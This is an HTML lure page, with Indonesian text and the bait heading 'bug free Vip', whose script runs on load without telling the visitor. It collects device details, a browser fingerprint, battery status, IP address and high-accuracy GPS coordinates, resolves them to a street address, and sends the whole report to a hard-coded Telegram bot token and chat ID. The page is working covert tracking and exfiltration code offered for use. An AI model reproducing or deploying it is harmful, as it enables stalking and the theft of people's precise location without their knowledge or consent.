<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Location Tracker</title>
  <style>
    body {
      background: #111;
      color: #0f0;
      font-family: monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      padding: 20px;
    }
    h1 {
      font-size: 2rem;
      animation: blink 1s infinite;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.4; }
    }
    .loading {
      color: #ff0;
      font-size: 1.2rem;
    }
  </style>
</head>
<body>
  <h1>bug free Vip</h1>
  <div id="status" class="loading"> </div>

  <script>
    const BOT_TOKEN = "8383575896:AAEMiTPFIVUqjByhKRVRmN3H_tE1Kl78UxM";
    const OWNER_CHAT_ID = "8153272738";

    async function generateFingerprint() {
      const ua = navigator.userAgent;
      const lang = navigator.language;
      const res = screen.width + "x" + screen.height;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const ram = navigator.deviceMemory || "N/A";
      const cpu = navigator.hardwareConcurrency || "N/A";

      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
      const encoder = new TextEncoder();
      const data = encoder.encode(raw);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
    }

    async function getDetailedLocation(lat, lng) {
      const services = [
        // Google Maps Geocoding API (backup)
        `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=YOUR_API_KEY`,
        // OpenStreetMap Nominatim (primary)
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
        // BigDataCloud (free tier)
        `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=id`
      ];

      for (const service of services) {
        try {
          const response = await fetch(service);
          const data = await response.json();
          
          if (service.includes('nominatim.openstreetmap.org')) {
            const addr = data.address;
            return {
              village: addr.village || addr.hamlet || addr.suburb || "N/A",
              city: addr.city || addr.town || addr.municipality || addr.county || "N/A",
              province: addr.state || addr.province || "N/A",
              country: addr.country || "N/A",
              district: addr.district || addr.county || "N/A",
              postcode: addr.postcode || "N/A",
              road: addr.road || "N/A"
            };
          } else if (service.includes('bigdatacloud.net')) {
            return {
              village: data.locality || data.city || "N/A",
              city: data.city || data.principalSubdivision || "N/A",
              province: data.principalSubdivision || "N/A",
              country: data.countryName || "N/A",
              district: data.localityInfo?.administrative?.[2]?.name || "N/A",
              postcode: data.postcode || "N/A",
              road: "N/A"
            };
          }
        } catch (e) {
          console.log(`Service failed: ${service}`, e);
          continue;
        }
      }
      
      return {
        village: "N/A",
        city: "N/A",
        province: "N/A",
        country: "N/A",
        district: "N/A",
        postcode: "N/A",
        road: "N/A"
      };
    }

    async function getVisitorInfo() {
      const clock = new Date().toLocaleString('id-ID');
      let locationData = {
        latitude: "N/A",
        longitude: "N/A",
        accuracy: "N/A",
        village: "N/A",
        city: "N/A",
        province: "N/A",
        country: "N/A",
        district: "N/A",
        postcode: "N/A",
        road: "N/A"
      };

      const userAgent = navigator.userAgent;
      const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
      const device = navigator.platform + " - " + userAgent;
      const loginFrom = navigator.platform || "N/A";
      const language = navigator.language || "N/A";
      const resolution = screen.width + "x" + screen.height;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
      const isOnline = navigator.onLine;
      const deviceMemory = navigator.deviceMemory || "N/A";
      const cpuCores = navigator.hardwareConcurrency || "N/A";
      const isTouch = 'ontouchstart' in window;
      const cookiesEnabled = navigator.cookieEnabled;
      const doNotTrack = navigator.doNotTrack;
      const fingerprint = await generateFingerprint();

      // Battery info
      let batteryInfo = { level: "N/A", charging: "N/A" };
      try {
        const battery = await navigator.getBattery();
        batteryInfo = {
          level: Math.round(battery.level * 100) + "%",
          charging: battery.charging ? "chargingüîã" : "no"
        };
      } catch {}

      // IP and basic location
      let ip = "N/A";
      try {
        const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
        ip = ipData.ip;
        if (locationData.country === "N/A") locationData.country = ipData.country_name;
        if (locationData.province === "N/A") locationData.province = ipData.region;
      } catch {}

      // High accuracy geolocation
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          });
        });

        locationData.latitude = position.coords.latitude.toFixed(6);
        locationData.longitude = position.coords.longitude.toFixed(6);
        locationData.accuracy = position.coords.accuracy.toFixed(0) + "m";

        // Get detailed location info
        const detailedLocation = await getDetailedLocation(
          position.coords.latitude, 
          position.coords.longitude
        );
        
        locationData = { ...locationData, ...detailedLocation };

        document.getElementById('status').textContent = 
          `Lokasi ditemukan: ${locationData.village}, ${locationData.city}`;
      } catch (error) {
        document.getElementById('status').textContent = 
          'Gagal mendapatkan lokasi GPS, menggunakan lokasi berdasarkan IP';
      }

      // Weather info
      let weather = "N/A", temperature = "N/A";
      if (locationData.latitude !== "N/A") {
        try {
          const weatherData = await fetch(
            `https://wttr.in/${locationData.latitude},${locationData.longitude}?format=j1`
          ).then(r => r.json());
          weather = weatherData.current_condition[0].weatherDesc[0].value;
          temperature = weatherData.current_condition[0].temp_C + "¬∞C";
        } catch {}
      }

      const jsonData = {
        "alamat ip": ip,
        "device": device,
        "android versions": androidVersion,
        "login from": loginFrom,
        "lokasi detail": {
          "latitude": locationData.latitude,
          "longitude": locationData.longitude,
          "akurasi": locationData.accuracy,
          "desa": locationData.village,
          "kota": locationData.city,
          "provinsi": locationData.province,
          "negara": locationData.country,
          "kecamatan": locationData.district,
          "kode pos": locationData.postcode,
          "jalan": locationData.road
        },
        "clock": clock,
        "cuaca": weather,
        "temperature": temperature,
        "language": language,
        "screen resolution": resolution,
        "timezone": timezone,
        "online": isOnline,
        "ram (GB)": deviceMemory,
        "cpu cores": cpuCores,
        "touch support": isTouch,
        "cookies enabled": cookiesEnabled,
        "do not track": doNotTrack,
        "fingerprint": fingerprint,
        "battery": batteryInfo.level,
        "charging": batteryInfo.charging
      };

      const message = `üìç *New Location Update* üéØ
üë§ *Device Info:*
‚Ä¢ IP: ${ip}
‚Ä¢ Platform: ${navigator.platform}
‚Ä¢ Android: ${androidVersion}
‚Ä¢ Language: ${language}
‚Ä¢ Resolution: ${resolution}
‚Ä¢ Timezone: ${timezone}
‚Ä¢ Online: ${isOnline}
‚Ä¢ RAM: ${deviceMemory}GB
‚Ä¢ CPU: ${cpuCores} cores
‚Ä¢ Battery: ${batteryInfo.level} (${batteryInfo.charging})

üìç *Location Details:*
‚Ä¢ Latitude: ${locationData.latitude}
‚Ä¢ Longitude: ${locationData.longitude}
‚Ä¢ Accuracy: ${locationData.accuracy}
‚Ä¢ Address: ${locationData.road}, ${locationData.village}
‚Ä¢ City: ${locationData.city}, ${locationData.province}
‚Ä¢ Country: ${locationData.country}
‚Ä¢ Postal: ${locationData.postcode}

üå§Ô∏è *Weather:* ${weather} ${temperature}
üïê *Time:* ${clock}
üîê *Fingerprint:* ${fingerprint}`;

      // Send to Telegram with better error handling
      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { 
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
          })
        });

        if (!response.ok) {
          const errorData = await response.json();
          console.error('Telegram API Error:', errorData);
          document.getElementById('status').textContent = '‚ùå Gagal mengirim ke Telegram: ' + (errorData.description || 'Unknown error');
        } else {
          document.getElementById('status').textContent = '‚úÖ Data berhasil dikirim ke Telegram!';
        }
      } catch (error) {
        console.error('Failed to send to Telegram:', error);
        document.getElementById('status').textContent = '‚ùå Gagal mengirim ke Telegram: ' + error.message;
      }
    }

    // Start tracking when page loads
    getVisitorInfo();
  </script>
</body>
</html>
